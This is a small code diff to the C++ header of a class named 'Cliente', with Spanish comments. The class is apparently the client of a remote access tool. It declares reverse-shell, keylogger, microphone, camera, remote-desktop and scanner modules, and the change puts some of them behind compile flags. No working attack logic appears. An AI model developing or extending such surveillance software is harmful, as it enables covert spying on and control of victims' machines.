@@ -61,12 +61,22 @@ class Cliente {
 		ReverseShell*      reverseSHELL     = nullptr;
 		Mod_Mic*           mod_Mic          = nullptr;
 		mod_Keylogger*     mod_Key          = nullptr;
+
+#ifdef __MOD_CAM
 		mod_Camera*        mod_Cam          = nullptr;
+#endif
 		mod_RemoteDesktop* mod_RemoteDesk   = nullptr;
 		mod_AdminVentanas* mod_AdminVen     = nullptr;
 		mod_Info*          mod_Inf0         = nullptr;
+
+#ifdef __MOD_SCAN
 		mod_Escaner*       mod_Scan         = nullptr;
+#endif
+
 		modFun*            mod_Fun          = nullptr;
+
+		//Funcion para comprobar  que mods estan habilitados
+		void CheckMyMods();
 		
 		//Map para armar los paquetes entrantes
 		std::map<int, std::vector<char>> paquetes_Acumulados;
